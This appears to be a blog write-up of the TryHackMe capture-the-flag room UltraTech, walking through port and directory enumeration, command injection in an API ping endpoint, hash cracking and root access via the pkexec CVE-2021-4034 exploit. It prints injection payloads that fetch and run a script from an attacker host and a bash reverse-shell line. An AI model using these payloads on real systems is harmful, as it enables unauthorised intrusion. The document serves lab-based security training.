---
title: "UltraTech"
date: 2025-03-19
image: /assets/img/tryhackme/UltraTech/UltraTech_image.jpg
description: Writeup of the TryHackMe-CTF UltraTech
categories: [TryHackMe, Medium]
tags: [linux, api, pkexec]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>UltraTech</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/ultratech1">https://tryhackme.com/room/ultratech1</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge UltraTech.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.77.78                   
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 07:02 EDT
  Nmap scan report for 10.10.77.78
  Host is up (0.038s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  21/tcp    open  ftp
  22/tcp    open  ssh
  8081/tcp  open  blackice-icecap
  31331/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 37.30 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 21,22,8081,31331 10.10.77.78
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 07:04 EDT
  Nmap scan report for 10.10.77.78
  Host is up (0.056s latency).

  PORT      STATE SERVICE VERSION
  21/tcp    open  ftp     vsftpd 3.0.3
  22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
  |   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
  |_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
  8081/tcp  open  http    Node.js Express framework
  |_http-cors: HEAD GET POST PUT DELETE PATCH
  |_http-title: Site doesn't have a title (text/html; charset=utf-8).
  31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds
```
From here I proceeded the analysis port by port.

## Port 8081 Analysis

I began with analyzing the website on port 8081, which was running a Node.js Express Framework. The site only displayed `UltraTech API v0.1.3`, so I proceeded with a Gobuster directory enumeration:
```bash
$ gobuster dir --url http://10.10.77.78:8081 --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.77.78:8081
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /auth                 (Status: 200) [Size: 39]
  /ping                 (Status: 500) [Size: 1094]
  Progress: 207643 / 207644 (100.00%)
  ===============================================================
  Finished
  ===============================================================
```

### Directory /auth

The website only displayed the following sentence:
```text
You must specify a login and a password
```

I tried to find the correct authentication parameters and was able to change the response by setting the following GET parameters:
```html
http://10.10.77.78:8081/auth?username=admin&password=test

response:
Invalid credentials
```

I attempted fuzzing credential combinations but didn't get any further.

## Port 31331 Analysis

The webserver displayed the UltraTech company website. I proceeded with a gobuster directory enumeration:
```bash
$ gobuster dir --url http://10.10.77.78:31331 --wordlist /usr/share/wordlists/dirb/common.txt
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.77.78:31331
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 293]
  /.htaccess            (Status: 403) [Size: 298]
  /.htpasswd            (Status: 403) [Size: 298]
  /css                  (Status: 301) [Size: 317] [--> http://10.10.77.78:31331/css/]
  /favicon.ico          (Status: 200) [Size: 15086]
  /images               (Status: 301) [Size: 320] [--> http://10.10.77.78:31331/images/]
  /index.html           (Status: 200) [Size: 6092]
  /javascript           (Status: 301) [Size: 324] [--> http://10.10.77.78:31331/javascript/]
  /js                   (Status: 301) [Size: 316] [--> http://10.10.77.78:31331/js/]
  /robots.txt           (Status: 200) [Size: 53]
  /server-status        (Status: 403) [Size: 302]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

I analyzed the `robots.txt` for disallow entries and found a `sitemap` entry:

```html
Robots:
  Allow: *
  User-Agent: *
  Sitemap: /utech_sitemap.txt

Sitemap:
  /
  /index.html
  /what.html
  /partners.html
```

The only interesting page was `partners.html`, which had a login interface:

![UltraTech Partner Login](/assets/img/tryhackme/UltraTech/thm_ultratech_1.jpg)

When entering some default credentials, the request was sent to the `/auth` endpoint of the API. Since I had already enumerated the `/auth` endpoint, I moved on.

### Directory /js Analysis

In the /js directory, I discovered an interesting script called `api.js`. In this script, I found the source code of the `/ping` endpoint. After analyzing the script, one part caught my attention:
```js
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

I interacted with the endpoint, inserted `localhost` for the `ip` parameter, and received the bash ping command output:

![Ping Test](/assets/img/tryhackme/UltraTech/thm_ultratech_2.jpg)

To exploit this, I created a file called `shell.sh` with the following content. I made the file accessible by spawning an HTTP server using python:
```bash
cat shell.sh                                                                                              
  #!/bin/bash
  bash -i >& /dev/tcp/[attackerip]/4242 0>&1
```

By navigating to the following two URLs, I was able to upload my bash script and execute it. 
```bash
http://10.10.77.78:8081/ping?ip=`wget http://[attackerip]/shell.sh -o shell.sh`

http://10.10.77.78:8081/ping?ip=`bash%20rev.sh`
```

After the second command, my Netcat listener received the connection. I tried several ports like 4444 and 9001 but succeeded only with 4242.
```bash
$ nc -lvnp 4242
listening on [any] 444 ...
connect to [attackerip] from (UNKNOWN) [10.10.77.78] 44136
bash: cannot set terminal process group (1236): Inappropriate ioctl for device
bash: no job control in this shell
www@ultratech-prod:~/api$
```

I performed shell stabilization and moved on. 

## Privilege Escalation r00t

After gaining initial access, I had access to the user `www`. I analyzed the user's home directory and found the API source code and the corresponding database. The database was a sqlite file, which I downloaded and opened using SQLite Browser.

![SQLite Database](/assets/img/tryhackme/UltraTech/thm_ultratech_3.jpg)

The database contained two hash values. Since the user `r00t` was also present on the machine, I attempted to look up the hash using Crackstation:

![Crackstation](/assets/img/tryhackme/UltraTech/thm_ultratech_4.jpg)

With the password provided by Crackstation, I was able to switch to the user `r00t`.

## Privilege Escalation root
I started by checking for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">CVE-2021-4034</a> and successfully gained root access:
```bash
r00t@ultratech-prod:~$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7f5fa6465000 at 0x7f5fa4f107b8>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# id
  uid=0(root) gid=1001(r00t) groups=1001(r00t),116(docker)
```

solved! :)